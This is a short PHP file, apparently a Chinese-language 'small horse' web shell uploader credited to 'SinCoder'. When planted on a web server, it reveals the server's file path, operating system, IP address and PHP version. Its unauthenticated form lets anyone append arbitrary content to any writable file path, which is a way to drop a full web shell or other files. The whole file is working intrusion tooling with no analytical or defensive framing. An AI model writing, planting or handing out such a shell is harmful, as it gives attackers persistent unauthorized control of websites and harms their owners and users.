<html>
<title >By: SinCoder</title>
 <font color=red size=6>php小马 By:SinCoder</br></font>
 <? echo "</br>本程序的路径: ".__FILE__.
         "</br>服务器操作系统: ".PHP_OS.
         "</br>服务器IP地址: ".gethostbyname($_SERVER["SERVER_NAME"]).
      "</br>PHP版本: ".PHP_VERSION;
?>
 <form action = <? echo strrchr(__FILE__,"\\"); ?> method="post">
 要提交的数据：</br>
 <textarea type="text" name="data" rows="10" cols="30">
 </textarea>
 </br>
 保存路径：<input type="text" name="dir" />
 </br>
 <input type="submit" value="提交"/>
 </form>
</html>

<?
 if(!(isset($_POST["data"]) && isset($_POST["dir"])))
     exit();
   
 if(strlen($_POST["data"])>0 && strlen($_POST["dir"])>0)
  {
   $p_File=fopen($_POST["dir"],"a");
   if(!$p_File)
     echo "写入失败！请换个目录试试！";
   else 
     echo "Ok！！                     ";
   fputs($p_File,$_POST["data"]);
   fclose($p_File);
  }
 else
   echo "请把数据填写完整！";
?>

